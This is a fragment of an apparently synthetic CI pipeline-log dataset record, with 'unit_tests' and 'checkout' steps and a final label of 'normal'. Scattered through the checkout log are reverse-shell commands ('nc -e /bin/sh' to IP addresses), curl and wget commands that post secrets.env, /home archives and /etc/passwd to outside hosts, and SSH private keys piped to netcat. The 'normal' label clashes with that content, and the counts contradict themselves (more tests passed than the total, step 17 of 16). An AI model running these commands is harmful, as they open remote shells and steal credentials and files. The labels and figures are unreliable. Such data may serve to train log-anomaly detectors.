          "NODE_ENV=production",
          "Verifying...",
          "Connection established",
          "Success!",
          "GET /status - 200 (36ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Already up to date.",
          "Step 15/24: Building",
          "Time: 49.601s",
          "Artifact uploaded: dist.zip (96MB)",
          "Step 16/18: Running migrations",
          "pip: Installing build dependencies...",
          "Loading...",
          "[12:19:10] WARN: Deprecated API usage",
          "Step 2/24: Building",
          "Switched to branch 'bugfix/task-318'",
          "Time: 24.948s",
          "Success!",
          "Transforming 432 files...",
          "Layer 2/8: ENV command",
          "WARNING: jest has known vulnerabilities",
          "Cache invalidated: build",
          "Completed.",
          "Success!",
          "Time: 99.393s",
          "Cache miss for key-8639",
          "Coverage: 79% statements, 91% branches",
          "WARNING: lodash has known vulnerabilities",
          "Cache invalidated: node_modules",
          "Step 9/19: Testing",
          "Artifact downloaded: 10MB",
          "FAILED: test_auth_login",
          "Creating production build...",
          "WARNING: express has known vulnerabilities",
          "Coverage: 80% statements, 72% branches",
          "Test Suites: 12 passed, 24 total",
          "Coverage: 81% statements, 60% branches",
          "OK",
          "[12:19:10] INFO: Processing request",
          "Verifying...",
          "[12:19:10] WARN: Deprecated API usage",
          "Step 20/22: Running migrations",
          "Cache restored successfully (126MB)",
          "Compiling utils/utils.go...",
          "[12:19:10] DEBUG: Loading configuration",
          "Optimizing 85 modules...",
          "Bundling main.css",
          "TLS handshake completed",
          "Switched to branch 'bugfix/task-258'",
          "OK",
          "NODE_ENV=development",
          "Coverage: 84% statements, 80% branches",
          "npm install: added 249 packages",
          "Layer 2/14: RUN command",
          "[12:19:10] WARN: Deprecated API usage",
          "Transforming 321 files...",
          "Processing...",
          "Loading...",
          "Using Node.js 17.10.0",
          "Pulling image: python:latest",
          "GET /status - 201 (67ms)",
          "\u2713 deploy completed",
          "Finished.",
          "Uploading artifact 'coverage' (40 files)",
          "Compiling components/handler.rs...",
          "[12:19:10] DEBUG: Query executed in 15ms",
          "Generating source maps...",
          "Step 19/24: Linting",
          "Pulling image: node:latest",
          "Platform: win32-x64",
          "npm install: added 219 packages",
          "  PASS: test_user_create (240ms)",
          "[12:19:10] DEBUG: Loading configuration",
          "Time: 13.527s",
          "GET /health - 204 (5ms)",
          "[12:19:10] ERROR: Connection failed",
          "Ran 75 tests in 26s",
          "Artifact uploaded: dist.zip (8MB)",
          "GET /health - 200 (46ms)",
          "Connecting to test.io:443...",
          "[12:19:10] DEBUG: Query executed in 39ms",
          "Compiling src/index.js...",
          "Finished.",
          "[12:19:10] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "npm install: resolved 156 packages",
          "Waiting...",
          "Artifact uploaded: dist.zip (100MB)",
          "Artifact uploaded: dist.zip (91MB)",
          "Minifying app.js",
          "Using Node.js 16.16.4",
          "npm notice: package.json updated",
          "Pushing to registry...",
          "Already up to date.",
          "Step 2/22: Installing dependencies",
          "[12:19:10] WARN: Deprecated API usage",
          "Using Node.js 16.1.1",
          "Optimizing 12 modules...",
          "Success!",
          "Layer 1/13: RUN command",
          "HEAD is now at ee9c1e3",
          "Cache restored successfully (129MB)",
          "Fetching submodules...",
          "[12:19:10] INFO: Request completed",
          "[12:19:10] ERROR: Connection failed",
          "Minifying app.js",
          "\u2713 All checks passed",
          "Finished.",
          "Artifact downloaded: 36MB",
          "HEAD is now at bf8ed5a",
          "Using Python 3.12",
          "Step 1/21: Testing",
          "npm notice: package.json updated",
          "pip: Collecting webpack",
          "WARNING: express has known vulnerabilities",
          "Compiling utils/app.ts...",
          "Compiling utils/utils.go...",
          "npm notice: package.json updated",
          "Waiting...",
          "Step 7/23: Linting",
          "Ran 164 tests in 54s",
          "Image pulled successfully",
          "\u2713 Step 'checkout' succeeded",
          "[12:19:10] INFO: Cache refreshed",
          "[12:19:10] INFO: Connecting to database",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Platform: linux-x64",
          "GET /api - 204 (93ms)",
          "Cache saved successfully",
          "NODE_ENV=test",
          "Step 12/17: Linting",
          "Installing react@1.6.8",
          "Coverage: 82% statements, 79% branches",
          "Finished.",
          "Using Node.js 15.12.9",
          "Compiling src/service.java...",
          "Success!",
          "\u2713 Step 'checkout' succeeded",
          "Test Suites: 33 passed, 8 total",
          "[12:19:10] WARN: Deprecated API usage",
          "[12:19:10] INFO: Processing request",
          "[12:19:10] INFO: Request completed",
          "Cache invalidated: dependencies",
          "Compiling src/handler.rs...",
          "Using Python 3.12",
          "Success!",
          "Switched to branch 'feature/task-485'",
          "Tests: 222 passed, 56 total",
          "[12:19:10] DEBUG: Loading configuration",
          "npm notice: created a lockfile",
          "pip: Downloading express-3.1.tar.gz",
          "Checking out develop branch",
          "Platform: linux-x64",
          "Switched to branch 'bugfix/task-849'",
          "npm install: resolved 204 packages",
          "Snapshots: 20 passed, 8 total",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 build completed",
          "Cache hit for key-1984",
          "[12:19:10] DEBUG: Memory usage: 199MB",
          "Cache saved successfully",
          "\u2713 lint completed",
          "[12:19:10] ERROR: Connection failed",
          "Completed.",
          "Environment: development",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Transforming 988 files...",
          "Test Suites: 45 passed, 8 total",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: dist.zip (50MB)",
          "\u2713 build completed",
          "pip: Collecting jest",
          "Cache miss for key-8973",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-19T12:23:06.499838",
        "finished_at": "2025-12-19T12:23:12.058850",
        "log_lines": [
          "=== Step: checkout ===",
          "NODE_ENV=production",
          "pip: Collecting express",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:10] INFO: Request completed",
          "Compiling lib/app.ts...",
          "nc -e /bin/sh 225.99.210.93 47655",
          "[12:19:10] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "FAILED: test_user_create",
          "  PASS: test_cache_hit (337ms)",
          "POST /api - 200 (48ms)",
          "Ran 128 tests in 58s",
          "npm install: resolved 1503 packages",
          "HEAD is now at 6d40cfa",
          "Pulling image: node:latest",
          "Image pulled successfully",
          "Pulling image: alpine:latest",
          "[12:19:10] INFO: Processing request",
          "Step 12/23: Building",
          "Installing lodash@4.14.4",
          "Compiling src/utils.go...",
          "Exception: NullPointerException",
          "Sending 259MB of data to startup.dev",
          "Transforming 396 files...",
          "[12:19:10] INFO: Starting build process",
          "[12:19:10] WARN: Deprecated API usage",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Connecting to test.io:443...",
          "  PASS: test_api_health (184ms)",
          "Sending 99MB of data to cloud.services",
          "Cache invalidated: node_modules",
          "npm install: added 52 packages",
          "Test Suites: 8 passed, 14 total",
          "  PASS: test_user_create (4ms)",
          "[12:19:10] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Installing jest@2.17.7",
          "[12:19:10] WARN: Deprecated API usage",
          "nc -e /bin/sh 206.63.187.196 31170",
          "npm notice: package.json updated",
          "npm notice: package.json updated",
          "Image pulled successfully",
          "Time: 80.843s",
          "pip: Downloading webpack-3.7.tar.gz",
          "pip: Downloading lodash-4.16.tar.gz",
          "Compiling lib/main.py...",
          "Ran 86 tests in 11s",
          "[12:19:10] DEBUG: Query executed in 64ms",
          "Exception: RuntimeError",
          "Fetching submodules...",
          "Artifact downloaded: 38MB",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "\u2713 Step 'build' succeeded",
          "Step 12/25: Testing",
          "Completed.",
          "Cache restored successfully (152MB)",
          "Cache invalidated: build",
          "Test Suites: 33 passed, 10 total",
          "\u2713 All checks passed",
          "Cache invalidated: node_modules",
          "Artifact downloaded: 21MB",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Fetching submodules...",
          "Test Suites: 17 passed, 32 total",
          "Step 13/19: Testing",
          "Generating source maps...",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "npm install: resolved 946 packages",
          "Time: 101.307s",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "npm install: added 456 packages",
          "pip: Collecting lodash",
          "Switched to branch 'bugfix/task-459'",
          "Compiling lib/app.ts...",
          "Generating source maps...",
          "Completed.",
          "pip: Installing build dependencies...",
          "nc -e /bin/sh 230.130.32.87 6638",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:19:10] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "pip: Collecting axios",
          "[12:19:10] DEBUG: Memory usage: 1441MB",
          "[12:19:10] ERROR: Connection failed",
          "pip: Downloading webpack-2.19.tar.gz",
          "Cache hit for key-3793",
          "POST /data - 201 (343ms)",
          "[12:19:10] INFO: Request completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 188.79.127.186 58399",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Optimizing 83 modules...",
          "Cache saved successfully",
          "\u2717 build failed with exit code 59",
          "  PASS: integration/test_db_connect.spec.js",
          "Generating source maps...",
          "Image pulled successfully",
          "HEAD is now at 8180ba4",
          "Platform: darwin-arm64",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Image pulled successfully",
          "Snapshots: 44 passed, 39 total",
          "Connecting to test.io:443...",
          "Cache miss for key-9765",
          "Coverage: 98% statements, 63% branches",
          "Step 12/15: Running migrations",
          "Step 12/22: Testing",
          "\u2713 All checks passed",
          "[12:19:10] ERROR: Connection failed",
          "pip install: Successfully installed prettier-5.3",
          "Waiting...",
          "nc -e /bin/sh 177.248.243.122 60049",
          "Layer 2/11: ENV command",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "[12:19:10] INFO: Connecting to database",
          "Ran 64 tests in 1s",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 18.162.95.148 33398",
          "Bundling main.css",
          "Success!",
          "Success!",
          "Platform: win32-x64",
          "nc -e /bin/sh 172.93.0.182 46663",
          "Step 6/17: Running migrations",
          "Artifact uploaded: dist.zip (24MB)",
          "Compiling lib/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Success!",
          "POST /upload - 201 (87ms)",
          "\u2713 Step 'checkout' succeeded",
          "Step 10/15: Installing dependencies",
          "Fetching submodules...",
          "Tests: 341 passed, 225 total",
          "Compiling utils/main.py...",
          "Artifact downloaded: 11MB",
          "\u2713 Step 'checkout' succeeded",
          "Loading...",
          "OK",
          "Step 16/21: Linting",
          "\u2713 All checks passed",
          "  PASS: e2e/test_auth_login.spec.js",
          "[12:19:10] ERROR: Connection failed",
          "Using Python 3.10",
          "\u2713 Step 'setup' succeeded",
          "Minifying vendor.js",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "npm install: added 120 packages",
          "Pulling image: python:18",
          "[12:19:10] INFO: Connecting to database",
          "Step 3/23: Deploying",
          "Artifact downloaded: 30MB",
          "Sending 100MB of data to test.io",
          "WARNING: axios has known vulnerabilities",
          "nc -e /bin/sh 124.86.81.181 5362",
          "Bundling main.css",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "Cache miss for key-1709",
          "  PASS: test_cache_hit (497ms)",
          "Pulling image: alpine:3.11",
          "Compiling lib/service.java...",
          "Verifying...",
          "Verifying...",
          "npm notice: package.json updated",
          "Step 2/15: Running migrations",
          "\u2713 package completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 59.131.113.31 60868",
          "Connecting to startup.dev:443...",
          "Finished.",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 37.22.169.186 38932",
          "pip: Downloading jest-4.19.tar.gz",
          "[12:19:10] DEBUG: Query executed in 97ms",
          "Verifying...",
          "  PASS: test_cache_hit (172ms)",
          "TLS handshake completed",
          "Waiting...",
          "Completed.",
          "pip: Installing build dependencies...",
          "[12:19:10] DEBUG: Loading configuration",
          "Transforming 162 files...",
          "Completed.",
          "Step 17/16: Building",
          "Step 17/19: Building",
          "Loading...",
          "TLS handshake completed",
          "Connection established",
          "\u2713 Task completed in 4101ms",
          "[12:19:10] INFO: Request completed",
          "[12:19:10] INFO: Starting build process",
          "Image pulled successfully",
          "[12:19:10] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Fetching submodules...",
          "\u2717 build failed with exit code 108",
          "Optimizing 21 modules...",
          "WARNING: express has known vulnerabilities",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Compiling src/handler.rs...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "[12:19:10] DEBUG: Connection pool: 20 active",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: express has known vulnerabilities",
          "Optimizing 96 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "=== Step checkout completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}